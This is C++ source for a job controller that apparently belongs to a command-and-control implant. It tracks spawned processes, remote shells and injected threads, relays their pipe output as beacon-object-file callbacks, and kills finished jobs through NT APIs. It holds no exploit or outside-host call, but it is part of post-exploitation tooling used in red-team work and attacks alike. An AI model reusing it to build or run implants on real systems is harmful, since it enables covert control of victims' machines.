#include "JobsController.h"
#include "ApiLoader.h"

void* JobsController::operator new(size_t sz) 
{
	void* p = MemAllocLocal(sz);
	return p;
}

void JobsController::operator delete(void* p) noexcept 
{
	MemFreeLocal(&p, sizeof(JobsController));
}

JobData JobsController::CreateJobData(ULONG taskId, WORD Type, WORD State, HANDLE object, WORD pid, HANDLE input, HANDLE output)
{
    JobData jobData = { taskId, Type, State, object, pid, input, output };
	this->jobs.push_back(jobData);
	return jobData;
}

void JobsController::ProcessJobs(Packer* packer)
{
	if ( !this->jobs.size() )
		return;

	for (int i = 0; i < this->jobs.size(); i++) {

        ULONG  available = 0;
		LPVOID buffer    = ReadDataFromAnonPipe(this->jobs[i].pipeRead, &available);
        
        if (available > 0) {
            // "Console Bridge": Route async process output as COMMAND_EXEC_BOF_OUT (51)
            // This mimics the original BOF output stream and ensures it appears in the
            // correct task window, bypassing potential issues with COMMAND_JOB handling.
            if (jobs[i].jobType == JOB_TYPE_PROCESS) {
                packer->Pack32(jobs[i].jobId); // bofTaskId
                packer->Pack32(51); // COMMAND_EXEC_BOF_OUT
                packer->Pack32(32); // CALLBACK_OUTPUT_UTF8
                packer->PackBytes((BYTE*)buffer, available);
            } else {
                // Legacy support for other job types
                packer->Pack32(jobs[i].jobId);
                packer->Pack32(COMMAND_JOB);
                packer->Pack8(jobs[i].jobType);
                packer->Pack8(JOB_STATE_RUNNING);
                packer->PackBytes((BYTE*)buffer, available);
            }
			
			MemFreeLocal(&buffer, available);
        }

		if (jobs[i].jobState == JOB_STATE_RUNNING) {

            ULONG status = 0;
			if (jobs[i].jobType == JOB_TYPE_PROCESS || jobs[i].jobType == JOB_TYPE_SHELL)
				ApiWin->GetExitCodeProcess(jobs[i].jobObject, &status);
			else if (jobs[i].jobType == JOB_TYPE_LOCAL || jobs[i].jobType == JOB_TYPE_REMOTE)
				ApiWin->GetExitCodeThread(jobs[i].jobObject, &status);

			if (status != STILL_ACTIVE) {
				if(jobs[i].jobType == JOB_TYPE_SHELL)
					jobs[i].jobState = JOB_STATE_KILLED;
				else
					jobs[i].jobState = JOB_STATE_FINISHED;
			}
		}

		if (jobs[i].jobState == JOB_STATE_KILLED || jobs[i].jobState == JOB_STATE_FINISHED) {

			if (jobs[i].jobType == JOB_TYPE_PROCESS || jobs[i].jobType == JOB_TYPE_SHELL)
				ApiNt->NtTerminateProcess(jobs[i].jobObject, NULL);
            else if (jobs[i].jobType == JOB_TYPE_LOCAL || jobs[i].jobType == JOB_TYPE_REMOTE)
				ApiNt->NtTerminateThread(jobs[i].jobObject, NULL);

			if (jobs[i].pipeRead) {
				ApiNt->NtClose(jobs[i].pipeRead);
				jobs[i].pipeRead = NULL;
			}
			if (jobs[i].pipeWrite) {
				ApiNt->NtClose(jobs[i].pipeWrite);
				jobs[i].pipeWrite = NULL;
			}

			packer->Pack32(jobs[i].jobId);
			packer->Pack32(COMMAND_JOB);
			packer->Pack8(jobs[i].jobType);
			packer->Pack8(jobs[i].jobState);

			jobs.remove(i);
			--i;
		}
	}
}
